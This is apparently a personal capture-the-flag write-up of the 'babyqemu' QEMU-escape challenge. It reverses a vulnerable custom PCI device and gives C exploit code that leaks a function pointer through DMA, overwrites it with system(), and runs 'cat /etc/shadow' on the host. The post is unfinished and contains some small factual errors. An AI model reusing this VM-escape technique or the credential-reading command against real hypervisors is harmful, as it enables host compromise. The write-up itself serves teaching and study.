---
title: "hitb-gsec-2017 babyqemu"
date: 2024-04-27T12:13:32+05:30
description: "Not sure I enjoy being inside the hypervisor!"
tags: [qemu, escape, pwn]
---

This was an old challenge, but one of my friends was teaching to it and I knew nothing about QEMU and physical hardware. I went into it know it was a QEMU escape so I won't be covering the mindset of finding that out but I'll break down the indepth meaning behind what the exploit does and some of the QEMU internals that make this problem solvable.

## The Problem

The provided resources for the challenge allude to it being a QEMU challenge:

```bash
-rwxr-xr-x    1 sam  staff   281B Jul 11 15:38 launch.sh
drwxr-xr-x   59 sam  staff   2.0K Jul 11 13:36 pc-bios
-rwxr-xr-x    1 sam  staff    38M Jul 11 13:32 qemu-system-x86_64
-rw-r--r--    1 sam  staff   3.7M Jul 11 13:32 rootfs.cpio
-rwxr-xr-x    1 sam  staff   7.0M Jul 11 13:35 vmlinuz-4.8.0-52-generic
```

If you've never used QEMU before, it's an open source emulator that allows for a crazy amount of flexibility and extensibility to run different architectures, machines, and OSs. We can see here we get provided with a compiled `qemu-system-x86_64` binary which is the emulator provided to us. We can also see `pc-bios`, `rootfs.cpio`, and `vmlinuz-4.8.0-52-generic` which look like a generic operating system. We can see how all of these files get wrapped together to spin up an emulated OS by looking inside `launch.sh`; this contains the following:

```bash
#!/bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda
```

A quick line by line breakdown of what's happening here:

1. We launch the `qemu` binary
2. We provide an `initrd` image (Initial RAM Disk)
3. We provide the `kernel` for the OS
4. We `append` our kernel arguments
5. We enable acceleration on the VM with `enable-kvm`
6. There is no screen provided so we throw away the `monitor`
7. The `-m` will let QEMU know there are no graphics and the system has 64Mb of RAM
8. The `-L` passes in the BIOS/UEFI for the device
9. We attach a custom `device` called `hitb` with an ID of `vba`

With that out of the way, go ahead and run `./launch.sh` and see how the image will boot up. After waiting for a minute, you'll be prompted for a username, typing in `root` is enough to keep drop into the shell inside our QEMU VM.

## QEMU Internal

The first part of understanding the solve for this challenge is understanding how QEMU works. This is needed for the reverse engineering work that will be reponsible for the provided custom device. We're gonna dive right into the deep end here and start reversing out this custom device. For decompiling `qemu-system-x86_64` I'll be using [Ghidra](https://github.com/NationalSecurityAgency/ghidra) but there are other alternatives such as Binary Ninja, Cutter, and radare2. Any dissassemble/decompiler will work for the task.

### Initialization

One of the first things we'll notice is that the binary for `qemu-system-x86_64` is not stripped. This is a large win for us as all our functions will have names associated with them allowing us to quickly find out there are quite a few functions that work on our `hitb` device:

```txt
Function name                        Start    Length
-------------                        -----    ------
do_qemu_init_pci_hitb_register_types 00300bf0 00000011
hitb_class_init                      00383e00 0000006F
hitb_dma_timer                       00384090 0000010F
hitb_enc                             00383dd0 0000001E
hitb_fact_thread                     00383f90 000000F9
hitb_instance_init                   00383ed0 00000069
hitb_mmio_read                       00384440 00000148
hitb_mmio_write                      003841a0 000002A0
hitb_obj_uint64                      00383f40 00000011
hitb_raise_irq                       00383f60 0000002B
pci_hitb_realize                     00384590 000000D0
pci_hitb_register_types              00383df0 0000000C
pci_hitb_uninit                      00383e70 00000060
```

These are all the functions mapped into the kernel to work with our `hitb` device. We'll start in order of how QEMU loads up the device. Unsuprisingly, `hitb_class_init` gets called first and will initialize the `hitb` device and call `pci_hitb_realize`. The `pci_hitb_realize` will call a few important functions that actually make the device go.

1. msi_init()
   - Initializes support for Message Signaled Interrupts
2. timer_init_tl
   - Initialzies timer list with new function for our device
3. qemu_mutex_init
   - ???
4. qemu_cond_init
   - ???
5. qemu_thread_create
   - Add a `hitb` thread for concurrect device usages
6. memory_region_init_io
   - Create our MMIO region for reading and writing to `hitb`
7. pci_register_bar
   - ???
  
Looking at the actual decompilation of this function, we can pull some critical information from each of these functions.

Firstly, in the `timer_init_tl` call there is a callback that will execute a function every so often. This call is the following:

```c
timer_init_tl((QEMUTimer *)(pdev[1].io_regions + 4), main_loop_tlg.tl[1], 1000000, hitb_dma_timer, pdev);
```

By checking out the QEMU source ([here](https://github.com/coreos/qemu/blob/ed988a3274c8e08ce220419cb48ef81a16754ea4/include/qemu/timer.h#L414)), we can see that the fourth argument is our callback for when the timer expires. This function will be getting periodically called to execute reads, writes, and other attributes of our `hitb`.

Secondly, the devices physical memory location is initialzed in the `memory_region_init_io` call. The call is the following:

```c
memory_region_init_io((MemoryRegion *)(pdev + 1), (Object *)pdev, &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000);
```

From this call, we can notice the last argument is the size of the MMIO region it allocates for our device: 0x100000. However, this piece is import as it points out the fact that by writing to specific *physical addresses* we can update the registers of this device.

### Device

With our device initialzed with QEMU, let's break down how we can interact with it through some of the other provided functionality.

It's important to note that the internal datatype that's getting used to keep track of our `hitb` device is the following:

| Offset | Length | Mnemonic                                         | DataType                   | Name       |
|--------|--------|--------------------------------------------------|----------------------------|------------|
| 0x0    | 0x9F0  | PCIDevice                                        | PCIDevice                  | pdev       |
| 0x9F0  | 0x100  | MemoryRegion                                     | MemoryRegion               | mmio       |
| 0xAF0  | 0x8    | QemuThread                                       | QemuThread                 | thread     |
| 0xAF8  | 0x28   | QemuMutex                                        | QemuMutex                  | thr_mutex  |
| 0xB20  | 0x30   | QemuCond                                         | QemuCond                   | thr_cond   |
| 0xB50  | 0x1    | _Bool                                            | _Bool                      | stopping   |
| 0xB54  | 0x4    | uint32_t                                         | uint32_t                   | addr4      |
| 0xB58  | 0x4    | uint32_t                                         | uint32_t                   | fact       |
| 0xB5C  | 0x4    | uint32_t                                         | uint32_t                   | status     |
| 0xB60  | 0x4    | uint32_t                                         | uint32_t                   | irq_status |
| 0xB68  | 0x20   | dma_state                                        | dma_state                  | dma        |
| 0xB88  | 0x30   | QEMUTimer                                        | QEMUTimer                  | dma_timer  |
| 0xBB8  | 0x1000 | char[4096]                                       | char[4096]                 | dma_buf    |
| 0x1BB8 | 0x8    | void _func_void_char_ptr_uint(char \* \, uint ) \* | _func_void_char_ptr_uint * | enc        |
| 0x1BC0 | 0x8    | uint64_t                                         | uint64_t                   | dma_mask   |

The main pieces of interest here are the following:

- `dma_buf`: Custom DMA to allow user to read/write into this buffer inside the struct.
- `enc`: This is function pointer to an encoding function for data in the `dma_buf`.
- `dma_state`: This is used to keep track of registers to commit operations on the device. The register for the status are below.

| Offset | Length | Mnemonic   | DataType   | Name |
|--------|--------|------------|------------|------|
| 0x0    | 0x8    | dma_addr_t | dma_addr_t | src  |
| 0x8    | 0x8    | dma_addr_t | dma_addr_t | dst  |
| 0x10   | 0x8    | dma_addr_t | dma_addr_t | cnt  |
| 0x18   | 0x8    | dma_addr_t | dma_addr_t | cmd  |

With this structure as the primary argument to our four main functions, we can understand what these functions are doing.

- `hitb_mmio_read`: Read from dst to src for length of cnt.
- `hitb_mmio_write`: Write from dst to src for length of cnt.
- `hitb_dma_timer`: Execute the current instructions written into the structure.
- `hitb_enc`: Encode the data passed in by XOR with 0x66 (typically `dma_buf`).

## Understand the Physical to Virtual

So this `hitb` device has been spun up by QEMU, but how on earth am I supposed to interact with it from inside my userspace that the exploit will run out of?

Our `hitb` device is going to get setup in physical memory. Recall that: physical memory refers to data stored directly on RAM addresses, whereas virtual memory refers to the simulated or abstracted RAM addresses used by programs. We need to write to a physical memory space from inside of our virtual memory space to actually interact with the diagram. Mhm, I don't quite get this yet so here's some great links:

[Qemu Internal PCI Device](https://dangokyo.me/2018/03/28/qemu-internal-pci-device/)

[mmap_mmio_dma](https://web.archive.org/web/20171202070800/http://nairobi-embedded.org/mmap_mmio_dma.html)

[linux_pci_device_driver](https://web.archive.org/web/20180328141010/http://nairobi-embedded.org:80/linux_pci_device_driver.html)

Probably should talk about *MMIO Regions* here too?

## PWNing the Device

Understand this, we can begin to put everything together for a full QEMU escape. We need three main prerequisites for this to happen:

1. I/O Memory for the `hitb` device
2. A userspace `dma_buff`
3. That `dma_buff` translate into a physical memory address

Firstly, we'll get the `hitb` I/O memory space. The easiest way to find this is by running `lspci` from inside the container. This will yeild the following results:

```sh
# lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:2333
```

Something looks familiar here from the `hitb_class_init` functionality. The last device `00:04.0` seems to follow the same vendor/device/class ID that our `hitb` device does. This means we can access the shared MMIO region for our device by opening up this device. To achieve that in C, we can do something like this:

```c
int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
unsigned char* iomem = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
```

This will create us an `iomem` buffer that allows us to read and write into the shared memory region for our `hitb` device. However, this buffer is located in physical memory while our exploit is running out of virtual memory... this requires us to build a `dma_buff` that can both be accessed from physical and virtual space.

This can be accomplished with the following two lines:

```c
unsigned char *dma_buff = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
mlock(dma_buff, 0x1000);
```

This is going to go ahead and create a `dma_buff` that we can access from inside the programs virtual memory space. However, for the translation of this buffers virutal address to a physical address it can't be in swap memory requiring us to `mlock()` this buffer so it doesn't go leaving the virtual memory space on us.

The complex part is now upon us of translating the `dma_buff` from virtual memory to physical memory. It seems pretty commonplace to create a helper function called `virt2phys` for these types of translations. My implementation follows closely to the generic ones I could find online:

```c
uint64_t virt2phys(void *addr)
{
 uint64_t virt_p = (uint64_t)addr;
 // **Given a virtual address, calculate offset into /pagemap**
 // Average page is 0x1000 (4096), so divide current ptr by page size
 // This results in number of pages to our buffer
 // Multiply that by 8 to get correct length (offset into file as each value is 8 bytes)
 uint64_t offset = (virt_p / 0x1000) * 8;
 // Store return value
 uint64_t phys;

 // Open /pagemap, seek to offset, read phys addr
 FILE *fd = fopen("/proc/self/pagemap", "r");
 fseek(fd, offset, SEEK_SET);
 fread(&phys, sizeof(uint64_t), 1, fd);

 // Convert from page number back to actual address
 phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
 return phys;
}
```

This function is pretty complex, but it's taken in a virtual buffer and used the `/proc/self/pagemap` file and some math to convert the virtual buffer address into the physical address of the buffer. If you'd like to know more about `/proc/self/pagemap`, check out this [page](https://www.kernel.org/doc/Documentation/vm/pagemap.txt). This can be run just like:

```c
uint64_t dma_phys = virt2phys(dma_buff);
```

With this, our initial prerequisites have been satisified and we can print these values out to ensure that everything is working properly.

```txt
HITB Device IOMEM: 0x7fdf9b600000
DMA in Virtual Space: 0x7fdf9b5ff000
DMA in Physical Space: 0x20c5000
```

These three pieces will allow us to write commands to the shared `iomem` for execution "by the device" along with writing data into a userspace buffer that can get accessed by a physical memory address "by the device".

The stage is set, time for some exploit writing. My plan of attack was leaking the programs address space by reading the `enc()` pointer, overwriting this pointer with `system()`, and then calling the "enc" function (which is `system` now) with the command we want to execute.

For each of these pieces, we'll be filling the `dma_state` structure from before with the according functionality we want to execute on the device. This comes in a set of steps similar to this for reading memory from the `hitb` device:

```c
iowrite(iomem, 128, 0x40000 + 0x1000);  // set_src, enc ptr in dma struct
iowrite(iomem, 136, dma_phys);          // set_dst, output to our dma buffer
iowrite(iomem, 144, 8);                 // set_cnt, get 8 bytes
iowrite(iomem, 152, 2 | 1);             // set_cmd, read bytes
sleep(2);
```

This will execute a read on the `enc()` pointer and store the read data in `dma_buff` that we can access. Some critical facts here are how the `iowrite` function actually works. This function actually looks like:

```c
void iowrite(char *iomem, uint64_t addr, uint64_t val) {
 *((uint64_t*)(iomem + addr)) = val;
}
```

Essentially, we're writing to an offset of the shared memory region of the `hitb` device. This allows us to access those `src`, `dst`, `cnt`, and `cmd` registers of the `dma_state`. In order of sequence, we set the address we want to read from, which is the next 8 bytes after the `dma_buf` inside the `Hitb_state` structure ([reference](#device)). We then fill out the destination to read out data as the physical address of our user controlled `dma_buff`. As we only need to read 8 bytes to get the full pointer for `enc()`, we set the count register to 8. Lastly, we want to read so the command to execute should be `3` (however the RE shows them using `var | 1` which makes it easy to write code that matches the dissassembly).

After that shebang, we sleep for a few seconds to let the execution of our command happen by the device. Once the read has completed, let's get our data out of our `dma_buff` for usage

```c
uint64_t hitb_enc_ptr = *((uint64_t*)dma_buff);          // Read address from filled buffer
uint64_t qemu_base = hitb_enc_ptr - 0x383dd0 + 0x100000; // Add base addr of 0x100000
printf("Leaked QEMU Addr: 0x%lx\n", hitb_enc_ptr);       // Leaked QEMU Addr: 0x557fe8c83ddo
printf("Leaked QEMU Base: 0x%lx\n", qemu_base);          // Leaked QEMU Base: 0x557fe8a00000
uint64_t system_call = qemu_base + 0x2fdb18 - 0x100000;  // Remove base addr of 0x100000
printf("system() Addr: 0x%lx\n", system_call);           // system Addr: 0x557fe8bfdb18
```

This results us in leaking the current userspace addressing. This information is quite useful as `system()` is located in the binary already meaning we don't need to leak LibC or any other libraries... just having the current binaries address space is enough to give us a pointer to call `system()`.

With this all setup, we need to overwrite the same pointer we just leaked. The commands look much the same with just a few changes:

```c
memcpy(dma_buff, &system_call, 8);      // Put system in DMA buffer
iowrite(iomem, 128, dma_phys);          // set_src, system_call addr in DMA phys
iowrite(iomem, 136, 0x40000 + 0x1000);  // set_dst, overwrite enc
iowrite(iomem, 144, 8);                 // set_cnt, write 8 bytes
iowrite(iomem, 152, 0 | 1);             // set_cmd, write bytes
printf("Overwrote hitb.enc() with system()\n");
sleep(2);
```

The first step is putting the address we want to write into the `dma_buff` so the device can read from it. We set the source of information (what we want to write) to the address we just put into `dma_buff`. Completing the invert from leaking the pointer, we now set the destionation to that address to overwrite `enc()` with `system()`. We then let the device know to only write 8 bytes there and that the command to execute is write.

After this sleep executes, our pointer has been successfully overwritten with data we control (haha it happens to be `system()`). However, right now the data in the `dma_buff` isn't a command we could execute in the host when we escape, so we need to write our shell command to the `dma_buf` inside `Hitb_state` structure that can be passed through to our overwritten `enc->system` call. Much like overwriting the pointer, we follow the same steps:

```c
char* exploit = "cat /etc/shadow;";
size_t str_size = strlen(exploit);
memcpy(dma_buff, exploit, str_size);    // Put exploit *string* in DMA buffer
iowrite(iomem, 128, dma_phys);          // set_src, system_call addr in DMA phys
iowrite(iomem, 136, 0x40000 + 0x100);   // set_dst, normal buffer space
iowrite(iomem, 144, str_size);          // set_cnt, exploit length
iowrite(iomem, 152, 0 | 1);             // set_cmd, write bytes
printf("Filled DMA for exploit!\n");
sleep(2);
```

We make a string with our shell command and then copy it into the `dma_buff` which can get passed along into the `dma_buf` in our `Hitb_state` stucture. The rest of the `iowrites` follow the same as previous examples.

With this all taken care of, it's time to actually trigger the exploit. We want to go down a codepath that will call `enc` (which is now `system`) with the `dma_buf`. This can be executed by reading just a byte when we call the correct command. This setup follows similarly but this time we execute a new command that will actually call our overwritten function pointer with our shell command:

```c
iowrite(iomem, 128, 0x40000 + 0x100);   // set_src, normal buffer with exploit
iowrite(iomem, 136, dma_phys);          // set_dst, phys dma location
iowrite(iomem, 144, 0x1);               // set_cnt, write only one byte to trigger
iowrite(iomem, 152, 6 | 1);             // set_cmd, enc bytes // 4 | 2 | 1
printf("Call overwritten hitb.enc()\n");
sleep(2);
```

We set our source of the read to be the shell command we wrote into the `dma_buf`. We need to provide a destination address for the command to execute correctly so we pass it our `dma_buff` physical address. We only need a single byte to trigger the bug so we set count to `1` and then call our overwritten function. The program now will execute `(*opaque->system)(buffer);` instead of `(*opaque->enc)(buffer,*(uint *)&(opaque->dma).cnt);` allowing us to escape the QEMU VM.

Mhm, I think that's all for now. I'll come back and hopefully clean this up at a later point. The full explolit code can be found here: [Link](/posts/hitb-gsec-2017/main.c). Thanks for reading!!!
